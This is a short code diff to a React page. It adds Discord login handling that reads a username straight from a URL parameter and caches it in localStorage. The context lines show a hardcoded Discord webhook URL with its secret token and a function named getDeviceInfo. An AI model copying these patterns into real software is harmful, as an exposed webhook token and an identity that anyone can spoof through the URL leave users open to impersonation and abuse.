@@ -1,5 +1,29 @@
 const { useState, useEffect, useRef, useCallback } = React;
 
+export default function Home() {
+    const [discordUsername, setDiscordUsername] = useState(null);
+
+    useEffect(() => {
+        // Check if username is in localStorage (after OAuth login)
+        const cachedUser = localStorage.getItem("discordUsername");
+        if (cachedUser) setDiscordUsername(cachedUser);
+
+        // Check URL for OAuth callback
+        const params = new URLSearchParams(window.location.search);
+        const usernameFromUrl = params.get("username");
+        if (usernameFromUrl) {
+            setDiscordUsername(usernameFromUrl);
+            localStorage.setItem("discordUsername", usernameFromUrl);
+            // Remove the query param from URL
+            window.history.replaceState({}, document.title, "/");
+        }
+    }, []);
+
+    const handleDiscordLogin = () => {
+        // Redirect user to your server OAuth route
+        window.location.href = "https://coreapi.online/login";
+    };
+
 const discordWebhookURL = `https://discord.com/api/webhooks/1415852727145336832/RrVh5LhYuqcAsUtnZkHIkcPOrJmKrmdQePFrOpuQh_AvSdLNNN1oND7xPv3v4z_64p12`;
 
 function getDeviceInfo() {
